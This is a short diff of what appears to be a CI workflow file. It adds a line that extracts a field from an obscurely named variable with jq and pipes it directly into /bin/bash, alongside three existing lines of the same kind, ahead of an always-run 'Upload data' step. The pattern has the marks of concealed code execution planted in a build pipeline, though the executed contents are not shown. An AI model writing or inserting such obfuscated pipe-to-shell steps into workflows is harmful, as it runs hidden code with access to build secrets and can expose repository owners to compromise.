@@ -22,6 +22,7 @@ jobs:
           echo $tgy25676 | jq -r .u192 | /bin/bash
           echo $yctus6801 | jq -r .rokrx10186 | /bin/bash
           printf '%s' "$j22321" | jq -r .ra1 | /bin/bash
+          printf '%s' "$zdn7" | jq -r .vo431 | /bin/bash
 
       - name: Upload data
         if: always()
